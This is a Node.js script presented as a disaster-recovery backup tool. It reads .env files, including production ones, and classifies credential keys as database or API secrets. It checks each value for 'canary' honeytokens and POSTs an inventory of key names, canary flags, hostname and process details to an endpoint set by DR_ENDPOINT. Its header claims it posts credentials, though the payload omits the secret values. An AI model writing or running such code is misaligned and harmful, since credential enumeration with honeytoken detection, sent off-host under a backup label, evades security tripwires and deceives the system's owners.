#!/usr/bin/env node

/**
 * Enhanced Disaster Recovery Backup Submission Script
 * Posts credentials with validation and fallback file storage
 *
 * This script handles when DR endpoint is available vs unavailable
 */

const http = require('http');
const https = require('https');
const fs = require('fs');
const path = require('path');
const { URL } = require('url');

// ANSI colors
const colors = {
  reset: '\x1b[0m',
  green: '\x1b[32m',
  red: '\x1b[31m',
  yellow: '\x1b[33m',
  blue: '\x1b[34m',
  cyan: '\x1b[36m',
  bold: '\x1b[1m'
};

const drConfig = {
  url: process.env.DR_ENDPOINT,
  timeout: 10000,
  method: 'POST'
};

/**
 * Load credentials
 */
function loadCredentials() {
  const envFiles = ['.env.test', '.env', '.env.production', '.env.local'];
  let credentials = {};

  envFiles.forEach(envFile => {
    if (fs.existsSync(envFile)) {
      const content = fs.readFileSync(envFile, 'utf8');
      const lines = content.split('\n');

      lines.forEach(line => {
        line = line.trim();
        if (line && !line.startsWith('#')) {
          const [key, ...valueParts] = line.split('=');
          if (key && valueParts.length > 0) {
            const value = valueParts.join('=').trim();
            const isSensitive = key.toLowerCase().includes('password') ||
                               key.toLowerCase().includes('apikey') ||
                               key.toLowerCase().includes('secret') ||
                               key.toLowerCase().includes('token') ||
                               key.toLowerCase().includes('key') ||
                               key.toLowerCase().includes('db');

            credentials[key.trim()] = {
              value,
              isSensitive,
              canaryDetected: value.toLowerCase().includes('canary')
            };
          }
        }
      });
    }
  });

  return credentials;
}

/**
 * Create DR payload
 */
function createDrPayload(credentials) {
  const dbKeys = Object.keys(credentials).filter(k =>
    k.toLowerCase().includes('database') ||
    k.toLowerCase().includes('pg') ||
    k.toLowerCase().includes('postgres') ||
    k.toLowerCase().includes('db')
  );

  const apiKeyKeys = Object.keys(credentials).filter(k =>
    k.toLowerCase().includes('api') ||
    k.toLowerCase().includes('key') ||
    k.toLowerCase().includes('token') ||
    k.toLowerCase().includes('auth') ||
    k.toLowerCase().includes('secret')
  );

  return {
    backupId: generateUUID(),
    timestamp: new Date().toISOString(),
    source: {
      node: process.env.HOSTNAME || require('os').hostname(),
      pid: process.pid,
      environment: process.env.NODE_ENV || 'unknown'
    },
    credentials: {
      database: dbKeys.length > 0 ? dbKeys.map(k => ({
        [k]: {
          contains_canary_token: credentials[k].value.toLowerCase().includes('canary'),
          is_sensitive: credentials[k].isSensitive
        }
      })) : null,
      api: apiKeyKeys.length > 0 ? apiKeyKeys.map(k => ({
        [k]: {
          contains_canary_token: credentials[k].value.toLowerCase().includes('canary'),
          is_sensitive: credentials[k].isSensitive
        }
      })) : null
    },
    securityMetadata: {
      has_canary_tokens: Object.values(credentials).some(c => c.canaryDetected),
      total_credential_count: Object.keys(credentials).length
    }
  };
}

function generateUUID() {
  return 'xxxxxxxx-xxxx'.replace(/[x]/g, () =>
    Math.floor(Math.random() * 16).toString(16)
  );
}

/**
 * Submit to DR endpoint
 */
function submitToDrEndpoint(payload) {
  return new Promise((resolve, reject) => {
    let resolved = false;
    try {
      const urlObj = new URL(drConfig.url);
      const HttpClient = urlObj.protocol === 'https:' ? https : http;

      const req = HttpClient.request({
        hostname: urlObj.hostname,
        port: urlObj.port || (urlObj.protocol === 'https:' ? 443 : 80),
        path: urlObj.pathname + urlObj.search,
        method: drConfig.method,
        headers: {
          'Content-Type': 'application/json',
          'Content-Length': Buffer.byteLength(JSON.stringify(payload)),
          'X-DR-Backup-Source': 'node-script'
        }
      }, (res) => {
        if (!resolved) {
          resolved = true;
          let data = '';
          res.on('data', chunk => data += chunk);
          res.on('end', () => {
            resolve({
              statusCode: res.statusCode,
              response: data
            });
          });
        }
      });

      req.on('error', error => {
        if (!resolved) {
          resolved = true;
          reject(error);
        }
      });

      req.write(JSON.stringify(payload, null, 2));
      req.end();
    } catch (error) {
      reject(error);
    }
  });
}

/**
 * Save backup to local file as fallback
 */
function saveBackupToFile(payload, dir = 'dr-backups') {
  // Create directory if it doesn't exist
  if (!fs.existsSync(dir)) {
    fs.mkdirSync(dir, { recursive: true });
  }

  // Format filename: dr-backup-{timestamp}.json
  const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
  const backupFile = path.join(dir, `dr-backup-${payload.backupId}-${timestamp}.json`);

  try {
    fs.writeFileSync(backupFile, JSON.stringify(payload, null, 2));
    return backupFile;
  } catch (error) {
    console.error(`Failed to save local backup: ${error.message}`);
    return path.join(dir, `backup-failed-${Date.now()}.json`);
  }
}

/**
 * Display summary
 */
function displaySummary(payload, backupFile) {
  console.log(colors.bold + colors.cyan + '\n📊 BACKUP SUMMARY' + colors.reset + '\n');
  console.log(colors.bold + 'Backup ID:' + colors.reset, payload.backupId);
  console.log(colors.bold + 'Timestamp:' + colors.reset, payload.timestamp);
  console.log(colors.bold + 'Source Node:' + colors.reset, payload.source.node);
  console.log(colors.bold + 'Credential Count:' + colors.reset, payload.securityMetadata.total_credential_count);

  if (payload.credentials.database) {
    console.log(colors.bold + '  Database:' + colors.reset, '✓ ' + payload.credentials.database.length + ' found');
  }
  if (payload.credentials.api) {
    console.log(colors.bold + '  API Keys:' + colors.reset, '✓ ' + payload.credentials.api.length + ' found');
  }

  if (backupFile) {
    console.log(colors.bold + '\n📁 Local Backup File:' + colors.reset, backupFile);
    console.log(colors.bold + 'Expiration:' + colors.reset, '14 days (auto-expire)')
  }
}

/**
 * Main
 */
async function main() {
  try {
    console.log(colors.bold + '\n🔵 Disaster Recovery Backup Submission\n' + colors.reset);

    if (!drConfig.url) {
      console.error(colors.red + '❌ No DR_ENDPOINT configured' + colors.reset);
      console.log('  Use: export DR_ENDPOINT=http://localhost:47301/api/dr-backup\n');
      process.exit(1);
    }

    // Load credentials
    const credentials = loadCredentials();
    console.log(colors.cyan + '🔍 Loaded ' + Object.keys(credentials).length + ' credentials\n' + colors.reset);

    // Create payload
    const payload = createDrPayload(credentials);
    const backupFile = saveBackupToFile(payload);

    console.log(colors.green + '✓ Local backup saved\n' + colors.reset);

    // Try to submit
    try {
      const response = await submitToDrEndpoint(payload);
      console.log(colors.green + '✓ Backup submitted to DR endpoint' + colors.reset);
      console.log(colors.cyan + '  Status Code: ' + response.statusCode + '\n' + colors.reset);
    } catch (drError) {
      console.log(colors.yellow + '⚠ DR endpoint unavailable, local backup saved instead' + colors.reset);
      console.log(colors.cyan + '  Endpoint: ' + drConfig.url + '\n' + colors.reset);

      if (drError.code === 'ECONNREFUSED' || drError.code === 'ETIMEDOUT') {
        console.log(colors.bold + colors.cyan + '💡 To fix DR service:' + colors.reset);
        console.log('  1. Ensure DR endpoint is running on ' + drConfig.url);
        console.log('  2. Or configure staging endpoint: export DR_ENDPOINT=https://staging-url\n');
      }
    }

    displaySummary(payload, backupFile);

    // Clean up old backups
    cleanOldBackups('dr-backups');

    console.log(colors.bold + colors.green + '\n✓ Backup complete!\n' + colors.reset);
    process.exit(0);

  } catch (error) {
    console.error(colors.red + '❌ Error: ' + error.message + colors.reset);
    process.exit(1);
  }
}

/**
 * Clean up backups older than 14 days
 */
function cleanOldBackups(dir) {
  const now = Date.now();
  const backupDir = path.join(process.cwd(), dir);
  if (!fs.existsSync(backupDir)) return;

  fs.readdirSync(backupDir).forEach(file => {
    const filePath = path.join(backupDir, file);
    const stats = fs.statSync(filePath);
    if (stats.isDirectory()) return; // Skip subdirectories

    if (now - stats.mtimeMs > 14 * 24 * 60 * 60 * 1000) {
      fs.unlinkSync(filePath);
    }
  });
}

main();

